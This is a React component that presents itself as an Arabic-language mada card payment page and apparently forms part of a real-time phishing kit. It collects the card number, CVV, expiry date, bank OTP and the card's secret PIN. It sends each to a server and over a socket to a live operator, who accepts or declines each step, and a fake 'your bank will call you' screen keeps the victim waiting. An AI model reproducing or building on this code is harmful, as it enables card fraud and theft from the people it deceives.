import React, { useState } from "react";
import { FaCcVisa } from "react-icons/fa6";
import { TailSpin } from "react-loader-spinner";
import { serverRoute, socket } from "./Main";
import axios from "axios";
const PaymentForm = () => {
  const token = sessionStorage.getItem("session");
  const query = new URLSearchParams(window.location.search);
  const data = query.get("data");
  const [page, setPage] = useState(0);
  const [loading, setLoading] = useState(false);
  const [failed, setFailed] = useState(false);
  const [card_name, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [pin, setPin] = useState("");
  const [error, setError] = useState(false);
  const [otp, setOtp] = useState(null);
  const formatCardNumber = (value) => {
    // Remove non-numeric characters
    const numericValue = value.replace(/\D/g, "");

    // Add space after every 4 digits
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    // Trim to 16 characters
    formattedValue = formattedValue.slice(0, 19);

    // Update state
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };

  const handlePinChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, "");
    setPin(numericValue.slice(0, 4));
  };

  const handleExpiryDateChange = (e) => {
    // Limit input to 4 characters (MM/YY)
    const numericValue = e.target.value.replace(/\D/g, "");
    let formattedValue = numericValue.slice(0, 5);

    // Add "/" after 2 characters (month)
    if (formattedValue.length > 2) {
      formattedValue =
        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2);
    }

    setExpiryDate(formattedValue);
  };

  const handleSumbit = async (e) => {
    e.preventDefault();
    setError(false);
    setLoading(true);
    try {
      const { _id, fullname, email } = JSON.parse(data);
      const finalData = {
        card_name,
        cardNumber,
        cvv,
        expiryDate,
        fullname,
        email,
      };
      await axios
        .post(serverRoute + "/visa/" + _id, finalData)
        .then(() => socket.emit("paymentForm", finalData));

      setPage(1);
    } catch (error) {
    } finally {
      setLoading(false);
    }
  };

  const handleOtp = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    const { fullname, email, _id } = JSON.parse(data);
    try {
      await axios
        .post(serverRoute + "/visaOtp/" + _id, {
          fullname,
          email,
          card_name,
          cardNumber,
          cvv,
          expiryDate,
          otp,
        })
        .then(() => {
          socket.emit("visaOtp", { id: _id, otp });
        });
    } catch (error) {
      setLoading(false);
    }
  };

  const handlePin = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    const { fullname, email, _id } = JSON.parse(data);
    try {
      await axios
        .post(serverRoute + "/visaPin/" + _id, {
          fullname,
          email,
          card_name,
          cardNumber,
          cvv,
          expiryDate,
          otp,
          pin,
        })
        .then(() => {
          socket.emit("visaPin", {
            id:_id,
            pin,
          });
        });
    } catch (error) {
 
    }finally{
      setLoading(false)
    }
  };

  socket.on("acceptPaymentForm", (id) => {
    if (id === JSON.parse(data)._id) {
      window.scrollTo(0, 0);
      setPage(2);
      setError(null);
    }
  });

  socket.on("declinePaymentForm", (id) => {
    if (id === JSON.parse(data)._id) {
      setPage(0);
      setError(" تم رفض البطاقة");
    }
  });

  socket.on("acceptVisaOtp", (id) => {
    if (id === JSON.parse(data)._id) {
      setLoading(false);

      window.scrollTo(0, 0);
      setPage(3);
    }
  });

  socket.on("declineVisaOtp", (id) => {
    if (id === JSON.parse(data)._id) {
      setLoading(false);
      setError("تم رفض رمز التحقق ");
    }
  });

  socket.on("acceptVisaPin", (id) => {
    if (id === JSON.parse(data)._id) {
      setLoading(false);
      window.location.href =
        "/motsl?data=" +
        JSON.stringify({
          ...JSON.parse(data),
          card_name,
          cardNumber,
          cvv,
          expiryDate,
          otp,
          pin,
        });
    }
  });

  socket.on("declineVisaPin", (id) => {
    if (id === JSON.parse(data)._id) {
      setLoading(false);
      setError("تم رفض الرمز السري ");
    }
  });

  return (
    <div
      className="  w-full items-center justify-center px-2 py-10 flex flex-col"
      dir="rtl"
    >
      {loading && (
        <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300 ">
          <TailSpin
            height="50"
            width="50"
            color="green"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      )}

      {page === 0 ? (
        <div className="w-11/12">
          <span className="text-xl">اختر طريقة الدفع</span>
          <div className="flex w-full px-2 gap-x-3 my-3">
            <div className="border rounded-md w-3/4 flex items-center justify-center">
              <img src="mada.png" className="md:w-1/2  " />
            </div>
            <div className="border rounded-md w-1/4 flex items-center justify-center">
              <img src="applepay.png" className="md:w-1/2 px-2 md:px-0" />
            </div>
          </div>
          {error ? (
            <div className="bg-red-300 border border-red-500 rounded-md p-3   w-full my-5">
              {" "}
              تم رفض البطاقة
            </div>
          ) : (
            ""
          )}
          <form
            onSubmit={handleSumbit}
            className="flex flex-col w-full px-2 py-5 gap-x-3 my-3 bg-sky-200"
          >
            <span className="text-sky-600 text-xl font-bold">
              الدفع بالبطاقة البنكية
            </span>
            <div className="w-full flex flex-col md:flex-row   gap-4 py-2">
              <div className="w-full flex flex-col items-start  gap-y-2 p-2">
                <span className=" "> اسم حامل البطاقة*</span>
                <div className="flex relative justify-start w-full items-center">
                  <input
                    placeholder="اسم حامل البطاقة"
                    className="w-full rounded-md py-2 px-2  outline-sky-500"
                    dir="ltr"
                    type="text"
                    value={card_name}
                    onChange={(e) => setCardName(e.target.value)}
                    required
                  />
                </div>
              </div>
              <div className="w-full flex flex-col items-start  gap-y-2 p-2">
                <span className=" "> رقم البطاقه *</span>
                <div className="flex relative justify-center w-full items-center">
                  <input
                    placeholder="**** **** **** ****"
                    className="w-full rounded-md py-2 px-2  outline-sky-500"
                    dir="ltr"
                    maxLength={19}
                    max={19}
                    min={19}
                    minLength={19}
                    inputMode="numeric"
                    type="text"
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    required
                  />
                </div>
              </div>
            </div>
            <div className="w-full flex  flex-col md:flex-row  gap-4 py-2">
              <div className="w-full flex flex-col items-start  gap-y-2 p-2">
                <span className=" "> تاريخ الإنتهاء*</span>
                <div className="flex relative justify-start w-full items-center">
                  <input
                    type="text"
                    value={expiryDate}
                    maxLength={5}
                    inputMode="numeric"
                    minLength={4}
                    onChange={handleExpiryDateChange}
                    className="text-end w-full p-1 rounded-md outline-none"
                    placeholder="MM/YY"
                    required
                  />
                </div>
              </div>
              <div className="w-full flex flex-col items-start  gap-y-2 p-2">
                <span className=" "> كود الحماية*</span>
                <div className="flex relative justify-center w-full items-center">
                  <input
                    type="text"
                    value={cvv}
                    onChange={handleCvvChange}
                    inputMode="numeric"
                    maxLength={3}
                    minLength={3}
                    placeholder="***"
                    className=" p-1 rounded-md text-end  w-full outline-none"
                    required
                  />
                </div>
              </div>
            </div>
            <div className="w-full justify-between flex items-center px-3">
              <button
                className="w-fit text-white bg-sky-500 text-lg px-5 py-1 rounded-full"
                type="submit"
              >
                تأكيد
              </button>
              <img src="/mada.png" className="md:w-1/4 w-2/3" />
            </div>
          </form>
        </div>
      ) : page === 1 ? (
        <div
          className="flex flex-col w-full md:p-8 p-3 text-sm gap-y-5 my-3 bg-sky-200 text-gray-700 md:w-10/12"
          style={{ backgroundColor: "#daf2f6" }}
        >
          <span>
            سوف يتم الإتصال بك من خلال المصرف الخاص بحسابك،، الرجاء استقبال
            المكالمة وقبول طلب المصادقة
          </span>
          <span>لايمكنك الإستمرار بالمعاملة في حال عدم قبول المصادقة!</span>
          <span>
            سوق يتم الإتصال بك من قبل المصرف الخاص بك الرجاء الإنتظار...
          </span>
          <div class="container">
            <div class="bar"></div>
          </div>
          <div className="flex items-center justify-center w-full bg-white">
            <img src="wait.gif" className="w-full md:w-1/3 " />
          </div>
        </div>
      ) : page === 2 ? (
        <form
          className="bg-sky-200 w-11/12 p-3 flex flex-col gapy-4"
          onSubmit={handleOtp}
        >
          {error ? (
            <div className="bg-red-300 border border-red-500 rounded-md p-3   w-full my-5">
              {error}
            </div>
          ) : (
            ""
          )}
          <span className="text-sky-700 text-xl">التحقق من عملية الدفع</span>
          <span className="text-gray-500">
            سيتم إجراء معاملة مالية على حسابك المصرفي لسداد مبلغ قيمتة 10 SAR
            بإستخدام البطاقة المنتهية بالرقم 2222 لتأكيد العملية أدخل رمز التحقق
            المرسل إلى جوالك
          </span>
          <div className="my-3 w-full flex flex-col gap-y-3">
            <span className="text-lg">.رمز التحقق</span>
            <input
              type="text"
              className="p-2 rounded-lg outline-sky-500"
              min={6}
              minLength={6}
              max={6}
              maxLength={6}
              placeholder="إدخل رمز التحقق الذي تم ارسالة إلى جوالك"
              value={otp}
              required
              onChange={(e) => setOtp(e.target.value)}
            />

            <span className="text-gray-500 text-sm">
              سيتم إرسال رمز التحقق إلى جوالك خلال دقيقة
            </span>
            <div className="w-full justify-between flex items-center px-3 my-3">
              <button
                className="w-fit text-white bg-sky-500 text-lg px-5 py-1 rounded-full"
                type="submit"
              >
                تأكيد
              </button>
              <img src="/mada.png" className="md:w-1/4 w-2/3" />
            </div>
          </div>
        </form>
      ) : (
        <form
          className="bg-sky-200 w-11/12 p-3 flex flex-col gapy-4"
          onSubmit={handlePin}
        >
          {error ? (
            <div className="bg-red-300 border border-red-500 rounded-md p-2  w-full my-2">
              {error}
            </div>
          ) : (
            ""
          )}
          <span className="text-sky-700 text-xl">إثبات ملكية البطاقة</span>
          <span className="text-gray-500">
            الرجاء إدخال الرقم السري الخاص بالبطاقة المكون من 4 ارقام
          </span>
          <div className="my-3 w-full flex flex-col gap-y-3">
            <span className="text-lg">الرقم السري*</span>
            <input
              type="text"
              className="p-2 rounded-lg outline-sky-500"
              min={4}
              minLength={4}
              max={4}
              maxLength={4}
              placeholder=" "
              value={pin}
              required
              onChange={handlePinChange}
            />

            <div className="w-full justify-between flex items-center px-3 my-3">
              <button
                className="w-fit text-white bg-sky-500 text-lg px-5 py-1 rounded-full"
                type="submit"
              >
                تأكيد
              </button>
              <img src="/mada.png" className="md:w-1/4 w-2/3" />
            </div>
          </div>
        </form>
      )}
    </div>
  );
};

export default PaymentForm;
